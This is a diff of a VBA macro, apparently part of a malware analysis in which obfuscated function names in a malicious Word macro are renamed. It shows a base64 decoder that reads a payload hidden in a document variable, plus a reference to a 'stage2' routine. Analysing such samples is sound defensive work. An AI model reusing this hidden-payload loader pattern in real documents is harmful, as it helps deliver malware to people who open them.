@@ -153,10 +153,10 @@ Sub stage2()
 End Sub
 
 'Called in "arrToStr" with document variable "kBQHAjmEelVSHUyT"
-Public Function createThrQutrArr(ByVal docVar As String) As Byte()
+Public Function decodeBase64(ByVal docVar As String) As Byte()
 
-    'Run function "assignOnce" if "bool1" is false
-    If Not bool1 Then assignOnce
+    'Run function "SetupBase64Tables" if "bool1" is false
+    If Not bool1 Then SetupBase64Tables
     
     'Get ascii value of "docVar"
     Dim asciiDocVarRet() As Byte: asciiDocVarRet = unicodeToAscii(docVar)
@@ -218,12 +218,12 @@ Public Function createThrQutrArr(ByVal docVar As String) As Byte()
         If long2 < thrQutrLen Then thrQutrLenArr(long2) = byte23Or: long2 = long2 + 1
         If long2 < thrQutrLen Then thrQutrLenArr(long2) = byte34Or: long2 = long2 + 1
     Loop
-    'Return threeQuaterArray
-    createThrQutrArr = thrQutrLenArr
+    'Return base64 decoded array
+    decodeBase64 = thrQutrLenArr
 End Function
 
 'Runs once then sets "bool1" to True so it isn't ran again
-Private Sub assignOnce()
+Private Sub SetupBase64Tables()
     
     Dim intCharVar As Integer, interator As Integer
     interator = 0
@@ -256,7 +256,7 @@ Private Sub assignOnce()
     bool1 = True
 End Sub
 
-'Called in "createThrQutrArr"
+'Called in "decodeBase64"
 Private Function unicodeToAscii(ByVal docVar As String) As Byte()
 
     Dim docVarCpy() As Byte: docVarCpy = docVar
@@ -287,8 +287,8 @@ Private Function arrToStr(arrInput As Variant, thrQutrOffset As Integer)
 
     Dim strRet As String
     Dim BarrPriv() As Byte
-    'Get computed byte array from Document variable "kBQHAjmEelVSHUyT" and "createThrQutrArr" function
-    BarrPriv = createThrQutrArr(ActiveDocument.Variables("kBQHAjmEelVSHUyT"))
+    'Get computed byte array from Document variable "kBQHAjmEelVSHUyT" and "decodeBase64" function
+    BarrPriv = decodeBase64(ActiveDocument.Variables("kBQHAjmEelVSHUyT"))
     
     strRet = ""
     'for "interator" in range len(arrInput)
